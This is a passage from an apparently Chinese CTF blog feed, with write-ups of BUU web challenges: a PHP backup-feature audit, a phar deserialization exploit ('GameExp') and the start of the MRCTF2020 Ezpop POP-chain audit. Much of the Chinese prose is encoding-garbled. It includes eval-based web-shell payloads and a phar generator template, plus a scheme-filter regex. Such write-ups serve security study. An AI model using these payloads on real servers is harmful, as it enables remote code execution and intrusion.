class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">defined(&#39;DS&#39;) or define(&#39;DS&#39;, DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#39;APP_DIR&#39;, realpath(&#39;.&#x2F;&#39;));</span><br><span class="line">error_reporting(0);</span><br><span class="line">function autoload_class($class)&#123;</span><br><span class="line">foreach(array(&#39;class&#39;) as $dir)&#123;</span><br><span class="line">$file &#x3D; APP_DIR.DS.$dir.DS.$class.&#39;.class.php&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">if(file_exists($file))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">include_once $file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($config)&#123;</span><br><span class="line">$upload_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">foreach(array(&#39;file&#39;,&#39;method&#39;) as $param)&#123;</span><br><span class="line">$upload_config[&#39;data&#39;][$param]&#x3D;$config[$param];</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; var_dump($upload_config);</span><br><span class="line">return $upload_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home($config)&#123;</span><br><span class="line">$home_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$home_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">return $home_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function back($config)&#123;</span><br><span class="line">$copy_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;filename&#39;]&#x3D;$config[&#39;post&#39;][&#39;filename&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;dest&#39;]&#x3D;$config[&#39;post&#39;][&#39;dest&#39;];</span><br><span class="line">return $copy_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spl_autoload_register(&#39;autoload_class&#39;);</span><br><span class="line"></span><br><span class="line">$request&#x3D;isset($_SERVER[&#39;REQUEST_URI&#39;])?$_SERVER[&#39;REQUEST_URI&#39;]:&#39;&#x2F;&#39;;</span><br><span class="line"></span><br><span class="line">$config[&#39;get&#39;]&#x3D;$_GET;</span><br><span class="line">$config[&#39;post&#39;]&#x3D;$_POST;</span><br><span class="line">$config[&#39;file&#39;]&#x3D;$_FILES;</span><br><span class="line"></span><br><span class="line">$parameters&#x3D;explode(&#39;&#x2F;&#39;,explode(&#39;?&#39;, $request)[0]);</span><br><span class="line">$class&#x3D;(isset($parameters[1]) &amp;&amp; !empty($parameters[1]))?$parameters[1]:&#39;home&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$method&#x3D;(isset($parameters[2]) &amp;&amp; !empty($parameters[2]))?$parameters[2]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $method;</span><br><span class="line"></span><br><span class="line">$config[&#39;class&#39;]&#x3D;$class;</span><br><span class="line">$config[&#39;method&#39;]&#x3D;$method;</span><br><span class="line"></span><br><span class="line">if(!empty($class))&#123;</span><br><span class="line">if(in_array($class, array(&#39;upload&#39;,&#39;home&#39;,&#39;back&#39;)))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$class_init_config&#x3D;call_user_func($class, $config);</span><br><span class="line">&#x2F;&#x2F; print_r($class_init_config);</span><br><span class="line">new $class_init_config[&#39;class&#39;]($class_init_config[&#39;data&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.phpä¸­å®ç°äº†æœ‰ä¸€ä¸ªç±»è‡ªåŠ¨åŠ è½½ï¼Œå¯ä»¥ä»¥<code>http://ip/class/method</code>çš„å½¢å¼å»è°ƒç”¨å¯¹åº”ç±»çš„å‡½æ•°</p><p>//ç±»è‡ªåŠ¨åŠ è½½</p><p><a href="https://www.php.net/manual/zh/language.oop5.autoload.php">https://www.php.net/manual/zh/language.oop5.autoload.php</a></p><p><img src="/2021/09/04/buu/20/image-20210905095559300.png" alt="image-20210905095559300"></p><p><img src="/2021/09/04/buu/20/image-20210905095718327.png" alt="image-20210905095718327"></p><p>ç„¶ååœ¨<code>class</code>æ–‡ä»¶å¤¹ä¸­æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œåˆ†åˆ«ä¸º</p><p><code>home.class.php</code>ã€ <code>upload.class.php</code> ã€<code>back.class.php</code>ï¼Œåˆ†åˆ«å¯¹åº”ä¸»é¡µã€ä¸Šä¼ å’Œå¤‡ä»½åŠŸèƒ½çš„å®ç°ï¼Œæ¥ä¸‹æ¥å®¡è®¡è¿™ä¸‰ä¸ªæ–‡ä»¶</p><p>æˆ‘ä»¬é‡‡ç”¨åˆ†è€Œç½®ä¹‹æ¥åˆ†æ</p><p>1.upload.class.phpï¼Œä¸Šä¼ åŠŸèƒ½</p><p><img src="/2021/09/04/buu/20/image-20210905100016508.png" alt="image-20210905100016508"></p><p>æ–‡ä»¶è¢«ä¸Šä¼ åˆ°<code>profile</code>ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå¯æ§ï¼Œä½†æ˜¯å…¶åç¼€è¿›è¡Œäº†é™åˆ¶ï¼Œåªèƒ½ç”¨txtï¼Œç„¶åå°±æ˜¯å¤§å°é™åˆ¶ã€‚</p><p>PHP in_array() å‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•</p><p>in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ä¸” <em>type</em> å‚æ•°è¢«è®¾ç½®ä¸º TRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td align="left"><em>type</em></td><td align="left">å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td></tr></tbody></table><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line"></span><br><span class="line">if (in_array(&quot;Mark&quot;, $people))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;åŒ¹é…å·²æ‰¾åˆ°&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;åŒ¹é…æœªæ‰¾åˆ°&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>echo â€œåŒ¹é…å·²æ‰¾åˆ°â€</p><p>2.backup.class.php,å¤‡ä»½åŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class back&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $method;</span><br><span class="line">    public $dest;</span><br><span class="line"></span><br><span class="line">    function __construct($config)&#123;</span><br><span class="line">        $this-&gt;filename&#x3D;$config[&#39;filename&#39;];</span><br><span class="line">        $this-&gt;method&#x3D;$config[&#39;method&#39;];</span><br><span class="line">        $this-&gt;dest&#x3D;$config[&#39;dest&#39;];</span><br><span class="line">        if(in_array($this-&gt;method, array(&#39;backup&#39;)))&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($this-&gt;filename, $this-&gt;dest);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function backup($filename, $dest)&#123;</span><br><span class="line">        $filename&#x3D;&#39;profile&#x2F;&#39;.$filename;</span><br><span class="line">        if(file_exists($filename))&#123;</span><br><span class="line">            $content&#x3D;htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</span><br><span class="line">            $password&#x3D;$this-&gt;random_code();</span><br><span class="line">            $r[&#39;path&#39;]&#x3D;$this-&gt;_write($dest, $this-&gt;_create($password, $content));</span><br><span class="line">            $r[&#39;password&#39;]&#x3D;$password;</span><br><span class="line">            echo json_encode($r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;* å…ˆéªŒè¯ä¿è¯ä¸ºå¤‡ä»½æ–‡ä»¶å,å†ä¿å­˜ä¸ºç§è—æ–‡ä»¶ *&#x2F;</span><br><span class="line">    private function _write($dest, $content)&#123;</span><br><span class="line">        $f1&#x3D;$dest;</span><br><span class="line">        $f2&#x3D;&#39;private&#x2F;&#39;.$this-&gt;random_code(10).&quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">        $stream_f1 &#x3D; fopen($f1, &#39;w+&#39;);</span><br><span class="line">        fwrite($stream_f1, $content);</span><br><span class="line">        rewind($stream_f1);</span><br><span class="line">        $f1_read&#x3D;fread($stream_f1, 3000);</span><br><span class="line"></span><br><span class="line">        preg_match(&#39;&#x2F;^&lt;\?php \$_GET\[\&quot;password\&quot;\]&#x3D;&#x3D;&#x3D;\&quot;[a-zA-Z0-9]&#123;8&#125;\&quot;\?print\(\&quot;.*\&quot;\):exit\(\); $&#x2F;s&#39;, $f1_read, $matches);</span><br><span class="line"></span><br><span class="line">        if(!empty($matches[0]))&#123;</span><br><span class="line">            copy($f1,$f2);</span><br><span class="line">            fclose($stream_f1);   </span><br><span class="line">            return $f2;     </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            fwrite($stream_f1, &#39;&lt;?php exit(); ?&gt;&#39;);</span><br><span class="line">            fclose($stream_f1);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function _create($password, $content)&#123;</span><br><span class="line">        $_content&#x3D;&#39;&lt;?php $_GET[&quot;password&quot;]&#x3D;&#x3D;&#x3D;&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;;</span><br><span class="line">        return $_content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function random_code($length &#x3D; 8,$chars &#x3D; null)&#123;</span><br><span class="line">        if(empty($chars))&#123;</span><br><span class="line">            $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $count &#x3D; strlen($chars) - 1;</span><br><span class="line">        $code &#x3D; &#39;&#39;;</span><br><span class="line">        while( strlen($code) &lt; $length)&#123;</span><br><span class="line">            $code .&#x3D; substr($chars,rand(0,$count),1);</span><br><span class="line">        &#125;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºé¦–å…ˆå°†<code>$filename</code>æ‹¼æ¥åˆ°<code>profile/</code>ï¼Œç„¶åæ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œå°†æ–‡ä»¶å†…å®¹è¯»å‡ºæ¥è¿›è¡Œhtmlç¼–ç ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸²ä½œä¸ºè¯»å–æ–‡ä»¶å†…å®¹çš„å¯†ç ï¼Œ</p><p>ä¹‹åè°ƒç”¨<code>_create()</code>å‡½æ•°ï¼Œå°†å¯†ç å’Œhtmlç¼–ç åçš„æ–‡ä»¶å†…å®¹ï¼Œæ‹¼æ¥åˆ°<code>&#39;&lt;?php $_GET[&quot;password&quot;]===&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;</code>é‡Œï¼Œ</p><p>ä¹‹åè°ƒç”¨<code>_write()</code>å‡½æ•°ï¼Œå°†ä¸Šé¢è¿™æ®µphpä»£ç å†™è¿›<code>private</code>ç›®å½•ï¼Œç„¶åå¯¹æ–‡ä»¶å†…å®¹å†…å®¹è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æ£€æµ‹ï¼Œè‹¥é€šè¿‡æ£€æµ‹,å°†æ–‡ä»¶å†…å®¹å†™è¿›<code>$dest</code>ï¼Œå¹¶å¤åˆ¶ä¸€ä»½åˆ°<code>$f2</code>ï¼Œè‹¥æ²¡æœ‰é€šè¿‡æ£€æµ‹ï¼Œåˆ™åœ¨<code>$dest</code>ä¸­å†™å…¥<code>&lt;?php exit(); ?&gt;</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç†æ¸…ç¨‹åºå¤§ä½“æµç¨‹åï¼Œå¤§è‡´çš„æ”»å‡»æ€è·¯å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªtxtçš„æ–‡ä»¶ï¼Œç„¶åå†é€šè¿‡backç”Ÿæˆphpæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;eval($_GET[0])&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œå¤‡ä»½ï¼Œç”Ÿæˆphpæ–‡ä»¶</p><p><img src="/2021/09/04/buu/20/image-20210905101422842.png" alt="image-20210905101422842"></p><p>æ‰§è¡Œå‚æ•°0</p><p><img src="/2021/09/04/buu/20/image-20210905101726252.png" alt="image-20210905101726252"></p><h4 id="GameExp"><a href="#GameExp" class="headerlink" title="GameExp:"></a>GameExp:</h4><p>è¿™é¢˜ä¹Ÿæ˜¯å‘äº†å¾ˆä¹…å•Š</p><p>é¦–å…ˆæ˜¯ä¸ºäº†åœ¨ç›®å½•ä¸‹ç”Ÿæˆpharæ–‡ä»¶</p><p>éœ€è¦ä¿®æ”¹é…ç½®php.iniï¼Œæ‰¾äº†å¥½ä¹…æ‰è§£å†³ï¼š</p><p><a href="https://blog.csdn.net/weixin_35835030/article/details/116174720">https://blog.csdn.net/weixin_35835030/article/details/116174720</a></p><p>åˆ›å»ºcreatephar.phpæ–‡ä»¶ï¼ˆè¿™ä»¥åå¯ä»¥ç”¨ä½œpharæ–‡ä»¶è§£é¢˜æ¨¡æ¿ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $output = <span class="string">&#x27;eval($_REQUEST[0]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifâ½‚ä»¶å¤´</span></span><br><span class="line">$o = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†â¾ƒå®šä¹‰meta-dataå­˜â¼Šmanifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„â½‚ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åâ¾ƒåŠ¨è®¡ç®—</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æœ‰php.exeçš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  createphar.php</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ç›®å½•ä¸‹å°±ä¼šç”Ÿæˆphp.phar,ç„¶åé‡å‘½åä¸ºphp.gif</p><p>ç„¶ååœ¨registeré¡µé¢æ³¨å†Œæ—¶ä¸Šä¼ è¯¥æ–‡ä»¶</p><p>æ³¨å†Œåéšæ„ï¼Œè¿™é‡Œæˆ‘ç”¨lex</p><p><img src="/2021/09/04/buu/20/image-20210907174315906.png" alt="image-20210907174315906"></p><p>è¿˜å¯ä»¥éªŒè¯ä¸€ä¸‹æ˜¯å¦ä¸Šä¼ æˆåŠŸ</p><p><img src="/2021/09/04/buu/20/image-20210907174611006.png" alt="image-20210907174611006"></p><p>æ¥ç€é‡æ–°æ³¨å†Œä¸€æ¬¡ï¼Œå¹¶ä¸”è¦ç”¨æŠ“åŒ…ä¿®æ”¹ï¼Œç”¨æˆ·åæ³¨æ„è¦ç”¨åˆšåˆšæ³¨å†Œçš„ï¼Œ</p><p>æ¥è§¦å‘ååºåˆ—åŒ–,åœ¨postå¢æ·»å‘½ä»¤</p><p><img src="/2021/09/04/buu/20/image-20210907175822286.png" alt="image-20210907175822286"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Novel&quot;&gt;&lt;a href=&quot;#Novel&quot; class=&quot;headerlink&quot; title=&quot;Novel:&quot;&gt;&lt;/a&gt;Novel:&lt;/h4&gt;&lt;p&gt;å‚è€ƒåšå®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/W4nder/p/1</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <link href="http://daweitech.github.io/2021/09/03/buu/19/"/>
    <id>http://daweitech.github.io/2021/09/03/buu/19/</id>
    <published>2021-09-03T07:48:25.000Z</published>
    <updated>2021-09-07T12:35:08.633Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00è§£é¢˜"><a href="#0x00è§£é¢˜" class="headerlink" title="0x00è§£é¢˜"></a>0x00è§£é¢˜</h4><p>å€Ÿé‰´åšå®¢</p><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpopâ€”åºåˆ—åŒ–popé“¾_marsxu626çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p><p>è¿™é¢˜ä¸»è¦æ˜¯ä»£ç å®¡è®¡ï¼Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šæ„é€ popé“¾</p><p>ä»£ç å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†è€Œè§£æå‡ ä¸ªä¸åŒçš„ç±»</p><p>1.Modifierç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;<span class="comment">//variableï¼Œå˜é‡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span 